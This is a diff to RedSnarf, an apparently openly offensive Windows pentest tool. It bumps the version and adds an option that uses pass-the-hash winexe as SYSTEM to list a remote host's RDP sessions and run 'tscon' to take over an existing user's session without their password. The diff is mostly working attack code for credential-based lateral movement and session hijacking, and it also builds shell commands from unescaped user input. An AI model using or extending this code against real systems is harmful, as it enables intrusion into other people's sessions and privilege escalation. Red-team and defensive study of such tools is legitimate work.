@@ -1679,7 +1679,7 @@ def main():
 
 #Display the user menu.
 banner()
-p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="RedSnarf Version 0.3l", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150),description = "Offers a rich set of features to help Pentest Servers and Workstations")
+p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="RedSnarf Version 0.3m", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150),description = "Offers a rich set of features to help Pentest Servers and Workstations")
 
 # Creds
 p.add_argument("-H", "--host", dest="host", help="Specify a hostname -H ip= / range -H range= / targets file -H file= to grab hashes from")
@@ -1706,6 +1706,7 @@ ugroup.add_argument("-uM", "--mssqlshell", dest="mssqlshell", default="", help="
 ugroup.add_argument("-uMT", "--meterpreter_revhttps", dest="meterpreter_revhttps", default="", help="<Optional> Launch Reverse Meterpreter HTTPS")
 ugroup.add_argument("-uP", "--policiesscripts_dump", dest="policiesscripts_dump", default="n", help="<Optional> Enter y to Dump Policies and Scripts folder from a Domain Controller")
 ugroup.add_argument("-uR", "--multi_rdp", dest="multi_rdp", default="n", help="<Optional> Enable Multi-RDP with Mimikatz")
+ugroup.add_argument("-uRP", "--rdp_connect", dest="rdp_connect", default="n", help="<Optional> Connect to existing RDP sessions without password")
 ugroup.add_argument("-uS", "--get_spn", dest="get_spn", default="n", help="<Optional> Get SPN's from DC")
 ugroup.add_argument("-uU", "--unattend", dest="unattend", default="n", help="<Optional> Enter y to look for and grap unattended installation files")
 ugroup.add_argument("-uX", "--xcommand", dest="xcommand", default="n", help="<Optional> Run custom command")
@@ -1804,6 +1805,7 @@ win_scp=args.win_scp
 lockdesktop=args.lockdesktop
 meterpreter_revhttps=args.meterpreter_revhttps
 sendtojohn=args.sendtojohn
+rdp_connect=args.rdp_connect
 
 #Call routine to send hashes to JtR
 if sendtojohn!='':
@@ -1924,6 +1926,38 @@ elif remotetargets[0:6]=='range=':
 	for remotetarget in IPNetwork(remotetargets[6:len(remotetargets)]):
 		targets.append (remotetarget);
 
+if rdp_connect in yesanswers:
+	
+	rdp_sessions = []
+
+	if len(targets)==1:
+		try:			
+			print colored("[+]RDP Session Switcher:\n",'green')
+						
+			proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd.exe /C query user \" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+			sessions = proc.communicate()[0]
+			print sessions
+
+			lines=sessions.splitlines()
+			
+			for line in lines:
+				if "rdp" in line:
+					rdpdest=line.find('rdp')
+					rdp_sessions.append(line[int(rdpdest):35].rstrip())
+			
+			print colored("[+]Session Destination",'yellow')		
+			for x in xrange(0,len(rdp_sessions)):
+				print colored("["+str(x)+"]"+rdp_sessions[x],'green')	
+			sess_dest = raw_input("\nPlease enter the number of the destination (if unsure select rdp-tcp#0): ")
+
+			usr_response = raw_input("\nPlease enter the ID of the session you wish to interact with : ")
+			if usr_response !="":
+				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"tscon "+usr_response+" /dest:"+rdp_sessions[int(sess_dest)]+"\" 2>/dev/null")
+				sys.exit()
+
+		except OSError:
+			print colored("[-]Something went wrong RDP Priv Esc Connect",'red')
+			logging.error("[-]Something went wrong RDP Priv Esc Connect")
 
 #Routine locks a remote users desktop
 if lockdesktop in yesanswers:
